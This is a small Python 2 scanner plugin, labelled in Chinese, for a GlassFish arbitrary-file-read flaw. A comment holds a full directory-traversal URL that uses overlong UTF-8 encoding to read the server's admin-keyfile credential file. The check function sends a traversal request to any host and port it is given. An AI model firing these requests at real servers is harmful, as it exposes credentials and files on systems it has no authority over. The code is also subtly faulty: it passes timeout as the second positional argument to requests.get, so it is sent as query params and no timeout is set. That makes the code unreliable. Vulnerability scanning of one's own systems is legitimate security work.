# coding:utf-8

import requests

def get_plugin_info():
    plugin_info = {
        "name": "Glassfish任意文件读取",
        "info": "可读取服务器上的任意文件",
        "exp_url": "http://bobao.360.cn/learning/detail/2564.html",
        "docker": "",
        "other": ""
    }
    return plugin_info

#  http://192.168.147.148:4848/theme/META-INF/%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./domains/domain1/config/admin-keyfile


def check(ip, port, timeout):
    try:
        url = "http://"+ip+":" + port
        res = requests.get(url+"/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",timeout)
        if res.status_code == 200:
            return u"%s 存在任意文件读取" % url
    except Exception, e:
        pass
